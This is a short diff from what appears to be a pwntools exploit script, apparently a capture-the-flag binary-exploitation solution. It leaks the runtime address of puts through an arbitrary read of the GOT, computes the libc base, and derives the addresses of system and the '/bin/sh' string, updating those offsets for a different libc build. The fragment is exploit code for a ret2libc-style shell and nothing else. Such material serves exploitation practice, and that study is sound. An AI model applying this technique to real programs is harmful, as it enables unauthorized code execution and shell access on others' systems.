@@ -25,10 +25,10 @@ puts_addr = arb_read(puts_got)
 
 log.info("puts : "+hex(puts_addr))
 
-libc = puts_addr - 0x5f140
-libc_argv = libc + 0x1b35f0
-system = libc + 0x3a940 
-binsh = libc + 0x15902b
+libc = puts_addr - 0x5fcb0
+libc_argv = libc + 0x1e8cf8
+system = libc + 0x3adb0 
+binsh = libc + 0x15bb0b
 
 stack_addr = arb_read(libc_argv)
 log.info("stack : "+hex(stack_addr))
